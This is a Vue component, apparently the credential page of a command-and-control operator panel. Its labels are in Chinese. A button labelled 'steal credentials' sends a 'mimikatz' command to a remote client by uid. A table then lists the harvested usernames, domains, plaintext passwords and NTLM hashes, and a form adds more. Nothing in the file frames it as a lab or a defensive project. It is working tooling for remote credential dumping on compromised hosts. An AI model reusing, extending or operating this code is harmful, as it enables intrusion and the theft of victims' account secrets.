<template>
  <div class="creds-container">
    <el-card shadow="never" class="toolbar-card">
      <div class="toolbar-content">
        <h2 class="toolbar-title">凭据管理</h2>
        <div class="toolbar-actions">
          <el-button type="primary" @click="dialogVisible = true">
            添加凭据
          </el-button>
          <el-button type="danger" @click="runMimikatz" :loading="dumping" :disabled="dumping">
            {{ dumping ? '转储中...' : '窃取凭据' }}
          </el-button>
        </div>
      </div>
    </el-card>

    <el-card shadow="never" style="margin-top: 16px">
      <el-table :data="credentials" v-loading="loading" stripe style="width: 100%">
        <el-table-column prop="username" label="用户名" min-width="140" />
        <el-table-column prop="target" label="域名" min-width="120" />
        <el-table-column prop="secret" label="密码/Hash" min-width="220">
          <template #default="{ row }">
            <el-tag :type="row.cred_type === 'password' ? 'warning' : 'danger'" style="font-family: monospace; word-break: break-all">
              {{ row.secret }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="cred_type" label="类型" width="90">
          <template #default="{ row }">
            <el-tag :type="row.cred_type === 'password' ? 'success' : 'info'" size="small">
              {{ row.cred_type === 'password' ? '明文' : 'Hash' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="source" label="来源" width="120" />
        <el-table-column prop="created_at" label="时间" width="170">
          <template #default="{ row }">
            {{ new Date(row.created_at * 1000).toLocaleString() }}
          </template>
        </el-table-column>
        <el-table-column label="操作" width="80" fixed="right">
          <template #default="{ row }">
            <el-button type="danger" size="small" @click="handleDelete(row)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <el-dialog v-model="dialogVisible" title="添加凭据" width="500px">
      <el-form :model="form" label-width="80px">
        <el-form-item label="用户名">
          <el-input v-model="form.username" placeholder="用户名" />
        </el-form-item>
        <el-form-item label="域名">
          <el-input v-model="form.target" placeholder="域名或IP" />
        </el-form-item>
        <el-form-item label="密码/Hash">
          <el-input v-model="form.secret" type="textarea" :rows="2" placeholder="密码或 NTLM hash" />
        </el-form-item>
        <el-form-item label="类型">
          <el-radio-group v-model="form.cred_type">
            <el-radio label="password">明文密码</el-radio>
            <el-radio label="hash">NTLM Hash</el-radio>
          </el-radio-group>
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="saving" @click="handleAdd">保存</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { useRoute } from "vue-router"
import ClientAPI from '@/api/clients'
import CredentialsAPI from '@/api/credentials'

const route = useRoute()
const credentials = ref([])
const loading = ref(false)
const dumping = ref(false)
const saving = ref(false)
const dialogVisible = ref(false)
const form = ref({ username: '', target: '', secret: '', cred_type: 'password' })

const fetchCredentials = async () => {
  loading.value = true
  try {
    const res = await CredentialsAPI.list()
    if (res.data.status === 200) {
      const uid = route.query.uid
      credentials.value = (res.data.data || []).filter(c => c.uid === uid)
    }
  } finally {
    loading.value = false
  }
}

const runMimikatz = async () => {
  dumping.value = true
  try {
    const res = await ClientAPI.send_commands({ uid: route.query.uid, command: 'mimikatz' })
    if (res.data.status === 200) {
      ElMessage.success('凭据窃取命令已发送')
    } else {
      ElMessage.warning(res.data.msg || '凭据窃取失败')
    }
  } catch {
    ElMessage.error('命令发送失败')
  } finally {
    dumping.value = false
  }
  setTimeout(fetchCredentials, 5000)
}

const handleAdd = async () => {
  if (!form.value.username || !form.value.secret) {
    ElMessage.warning('用户名和密码不能为空')
    return
  }
  saving.value = true
  try {
    const res = await CredentialsAPI.add({
      uid: route.query.uid,
      target: form.value.target,
      username: form.value.username,
      secret: form.value.secret,
      cred_type: form.value.cred_type,
      source: 'manual',
      notes: '',
    })
    if (res.data.status === 200) {
      ElMessage.success('凭据已添加')
      dialogVisible.value = false
      form.value = { username: '', target: '', secret: '', cred_type: 'password' }
      await fetchCredentials()
    }
  } catch {
    ElMessage.error('添加失败')
  } finally {
    saving.value = false
  }
}

const handleDelete = async (row) => {
  try {
    await ElMessageBox.confirm('确认删除此凭据?', '提示')
    const res = await CredentialsAPI.delete(row.id)
    if (res.data.status === 200) {
      ElMessage.success('已删除')
      await fetchCredentials()
    }
  } catch {
    // cancelled
  }
}

onMounted(fetchCredentials)
</script>

<style scoped>
.creds-container { padding: 16px; }
.toolbar-card { margin-bottom: 0; }
.toolbar-content { display: flex; justify-content: space-between; align-items: center; }
.toolbar-title { margin: 0; font-size: 18px; font-weight: 600; }
.toolbar-actions { display: flex; gap: 8px; }
.el-dialog .el-input__wrapper input,
.el-dialog .el-textarea__inner { color: #333 !important; }
</style>
